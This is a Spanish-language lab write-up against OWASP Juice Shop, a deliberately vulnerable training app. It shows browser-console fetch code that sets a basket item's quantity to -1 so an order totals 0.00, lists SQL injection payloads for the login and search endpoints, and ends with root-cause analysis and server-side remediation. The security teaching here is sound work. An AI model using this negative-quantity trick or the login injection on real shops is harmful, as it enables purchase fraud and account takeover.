Vulnerabilidad del carrito: dejar la compra en 0

Objetivo del taller: https://playground.kontinuagroup.com:3000/#/search (OWASP Juice Shop)

OWASP A04 Insecure Design OWASP A01 Broken Access Control Business Logic Flaw Validacion server-side ausente

1. Resumen

El total del pedido se calcula en el servidor como Σ (precio × cantidad), pero la API no valida que la cantidad sea un entero positivo. La interfaz impide bajar la cantidad de 1, la API no. Enviando una cantidad negativa por PUT /api/BasketItems/:id el subtotal de ese item se vuelve negativo y permite cuadrar el total del pedido en 0.00. El pedido se procesa.

Falla de logica de negocio, no de inyeccion. No se logra con SQLi: el calculo del total no concatena SQL controlado por el usuario; la SQLi del buscador es solo lectura (SELECT), no modifica precios ni totales.

2. Prueba de concepto (paso a paso)

Requisito

Estar logueado (hace falta carrito propio). Todo se hace desde la consola del navegador (F12 → Console), sin Burp ni herramientas externas.

Paso 1 — Agregar 2 productos del mismo precio

En #/search agrega Apple Juice (1000ml) y Banana Juice (1000ml) (ambos 1.99). Abre #/basket. Total normal = 3.98.

Paso 2 — Ver los items del carrito

En la consola:

let bid = sessionStorage.getItem('bid');     // Juice Shop guarda el basket id aqui
let tok = localStorage.getItem('token');
fetch('/rest/basket/' + bid, { headers: { Authorization: 'Bearer ' + tok } })
  .then(r => r.json())
  .then(d => console.table(
    d.data.Products.map(p => ({
      itemId: p.BasketItem.id, producto: p.name,
      precio: p.price, cantidad: p.BasketItem.quantity
    }))
  ));

Anota el itemId del segundo producto (el que volveremos negativo).

Paso 3 — Explotar: cantidad negativa

Reemplaza <ITEM_ID> por el itemId del segundo producto:

fetch('/api/BasketItems/<ITEM_ID>', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ quantity: -1 })   // <- la UI nunca permite esto
}).then(r => r.json()).then(console.log);

Respuesta 200 OK con quantity: -1. Subtotal servidor: 1.99×1 + 1.99×(-1) = 0.

Paso 4 — Comprar

Checkout con Standard Delivery (0.00). El pedido se coloca por Total Price: 0.00.

Ajuste general: si los precios no son iguales, usa precio_A·cant_A + precio_B·cant_B = 0. Ej.: A=3.99 (cant 1), B=1.33 → cant_B = -3 (1.33×-3 = -3.99). Total = 0.

4. Vector SQLi con UPDATE: descartado (verificado)

Se evaluo la hipotesis de lograr el total 0 mediante SQL Injection con UPDATE (p. ej. UPDATE Products SET price = 0). No es viable en esta instancia.

Lo que si existe

  • El buscador /rest/products/search?q= es inyectable (backend SQLite): q=test' devuelve SQLITE_ERROR.
  • El login /rest/user/login es vulnerable a SQLi de autenticacion (' OR 1=1-- devuelve token de admin).
  • Ambos puntos ejecutan sentencias SELECT, no UPDATE.

Por que no se puede UPDATE

El driver SQLite de Juice Shop prepara una sola sentencia. Las stacked queries (encadenar ;UPDATE ...) se rechazan en el parser. Pruebas sobre la instancia en vivo (producto id=1, precio real 1.99):

UNION no sirve: solo permite SELECT (exfiltrar), nunca modificar. El unico "update por inyeccion" del motor es NoSQL sobre resenas de producto (Mongo), que no afecta precio ni total.

Conclusion: el objetivo "compra en 0" corresponde al reto Payback Time (categoria Improper Input Validation), que se resuelve con la cantidad negativa de la seccion 2, no con SQLi-UPDATE. La via SQLi-UPDATE queda documentada como descartada tras prueba.

5. Causa raiz y remediacion

Causa

  • No hay validacion de dominio en el servidor: quantity se acepta negativa y sin cota.
  • Se confia en la restriccion del frontend (minimo 1), unica "proteccion" existente.
  • El endpoint PUT /api/BasketItems/:id no verifica que el item pertenezca al carrito del usuario (riesgo adicional de IDOR).

Remediacion

  1. Validar en el servidor: quantity entero y 1 ≤ quantity ≤ stock. Rechazar 0 y negativos.
  2. Imponer el invariante total ≥ 0 antes del checkout; recalcular el total del lado del servidor, nunca confiar en el cliente.
  3. Autorizacion por objeto: el BasketItem debe pertenecer al basket del usuario autenticado (corrige el IDOR).
Trade-off: validar solo en el frontend da buena UX pero cero seguridad; el servidor es la unica frontera de confianza. El arreglo es un guard de pocas lineas en el controlador del PUT, costo minimo frente al impacto (fraude de compras a 0).
